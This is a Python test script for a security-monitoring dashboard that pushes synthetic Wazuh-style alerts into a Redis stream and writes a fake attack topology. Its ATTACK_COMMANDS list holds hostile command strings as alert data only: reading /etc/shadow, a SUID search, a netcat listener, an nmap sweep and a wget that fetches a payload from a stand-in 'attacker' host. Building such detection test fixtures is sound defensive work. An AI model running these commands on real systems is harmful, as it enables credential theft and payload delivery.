"""Continuous synthetic-traffic injector for dashboard testing.

XADDs Wazuh-shaped alerts to `strix:alerts:raw` at a configurable rate,
splitting events between an "attacker" srcip and a benign baseline so the
detection-quality + topology panels have something to label.

Run:
    apps/api/.venv/bin/python infra/scripts/inject_traffic.py \
        --redis redis://localhost:6380/0 --rate 5 --duration 120

Pre-req: host stack already up (make host-up).
"""

from __future__ import annotations

import argparse
import asyncio
import json
import random
import time
import uuid
from datetime import UTC, datetime
from pathlib import Path

import msgpack  # type: ignore[import-untyped]
import redis.asyncio as aioredis

ATTACKER_IP = "10.0.0.42"
BENIGN_IPS = ["10.0.0.10", "10.0.0.11", "10.0.0.12"]
VICTIM_AGENTS = [("001", "victim1"), ("002", "victim2"), ("003", "victim3")]

ATTACK_COMMANDS = [
    "sudo -u root /usr/bin/bash -c 'cat /etc/shadow'",
    "awk -F: '{print $1}' /etc/sudoers",
    "ps -eo pid,user,cmd",
    "/usr/bin/find / -perm -4000 -type f 2>/dev/null",
    "nc -lvnp 4444",
    "nmap -sS 10.0.0.0/24",
    "wget http://attacker/payload -O /tmp/.x",
]
BENIGN_COMMANDS = [
    "/usr/bin/which python3",
    "/usr/bin/grep -r foo /etc/hosts",
    "/usr/bin/ls /home/user",
    "/usr/bin/cat /etc/passwd",
    "/usr/bin/dpkg -l",
]

# Shared run_id so the topology.json the API reads belongs to this run.
RUN_ID = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ") + f"-{random.randint(100000, 999999)}"


def write_topology(repo_root: Path) -> Path:
    """Write a topology.json the API can pick up via /simulation/runs/latest."""
    run_dir = repo_root / "infra" / "simulation" / "runs" / RUN_ID
    run_dir.mkdir(parents=True, exist_ok=True)
    topo = {
        "run_id": RUN_ID,
        "started_at": datetime.now(UTC).isoformat().replace("+00:00", "Z"),
        "attacker_ip": ATTACKER_IP,
        "apt_group": "APT-SYNTHETIC",
        "tactics_planned": [
            "Reconnaissance",
            "Discovery",
            "Privilege Escalation",
            "Defense Evasion",
            "Credential Access",
            "Collection",
        ],
        "victims": [
            {"ip": f"10.0.0.{4 + i}", "hostname": name, "agents": ["wazuh", "auditd"]}
            for i, (_aid, name) in enumerate(VICTIM_AGENTS)
        ],
    }
    (run_dir / "topology.json").write_text(json.dumps(topo, indent=2))
    return run_dir / "topology.json"


def make_alert(*, malicious: bool) -> dict:
    aid, aname = random.choice(VICTIM_AGENTS)
    alert_id = f"inj-{uuid.uuid4().hex[:12]}"
    now = datetime.now(UTC).isoformat().replace("+00:00", "Z")
    if malicious:
        cmd = random.choice(ATTACK_COMMANDS)
        srcip = ATTACKER_IP
        rule_id = random.choice(["100100", "100200", "100300", "80710"])
        level = random.choice([8, 10, 12, 14])
        tactic = random.choice(["TA0004", "TA0006", "TA0007", "TA0008", "TA0009"])
        technique = random.choice(["T1548.003", "T1059.004", "T1003.008", "T1057"])
    else:
        cmd = random.choice(BENIGN_COMMANDS)
        srcip = random.choice(BENIGN_IPS)
        rule_id = "5715"
        level = 3
        tactic = "TA0007"
        technique = "T1083"

    return {
        "_id": alert_id,
        "_source": {
            "id": alert_id,
            "@timestamp": now,
            "agent": {"id": aid, "name": aname, "ip": f"10.0.0.{int(aid) + 3}"},
            "rule": {
                "id": rule_id,
                "firedtimes": 1,
                "level": level,
                "description": f"injector — {'attack' if malicious else 'benign'} {cmd[:30]}",
                "mitre": {"tactic": [tactic], "technique": [technique]},
            },
            "decoder": {"name": "auditd"},
            "location": "/var/log/audit/audit.log",
            "full_log": f"type=SYSCALL injector cmd={cmd}",
            "data": {
                "command": cmd,
                "srcip": srcip,
                "srcport": str(random.randint(1024, 65535)),
                "audit": {
                    "exe": cmd.split()[0] if cmd.split() else "/bin/true",
                    "auid": "0" if malicious else "1000",
                    "uid": "0" if malicious else "1000",
                    "pid": str(random.randint(1000, 99999)),
                    "key": "audit-wazuh-x" if malicious else "audit-wazuh-w",
                },
            },
        },
    }


async def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--redis", default="redis://localhost:6380/0")
    p.add_argument("--rate", type=float, default=5.0, help="events per second")
    p.add_argument("--duration", type=int, default=120, help="seconds")
    p.add_argument("--malicious-frac", type=float, default=0.55)
    args = p.parse_args()

    repo_root = Path(__file__).resolve().parents[2]
    topo_path = write_topology(repo_root)
    print(f"[inject] run_id={RUN_ID}  topology={topo_path}")

    r = aioredis.from_url(args.redis)
    deadline = time.monotonic() + args.duration
    sent = 0
    sleep_per = 1.0 / max(args.rate, 0.1)
    try:
        while time.monotonic() < deadline:
            alert = make_alert(malicious=random.random() < args.malicious_frac)
            envelope = {
                "alertId": alert["_id"],
                "ingestedAt": datetime.now(UTC).isoformat(),
                "rawJson": alert,
            }
            payload = msgpack.packb(envelope, use_bin_type=True)
            await r.xadd(
                "strix:alerts:raw", {b"payload": payload},
                maxlen=100_000, approximate=True,
            )
            sent += 1
            if sent % 25 == 0:
                print(f"[inject] sent={sent}  elapsed={time.monotonic() - (deadline - args.duration):.1f}s")
            await asyncio.sleep(sleep_per)
    finally:
        await r.aclose()
    print(f"[inject] done. sent={sent}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
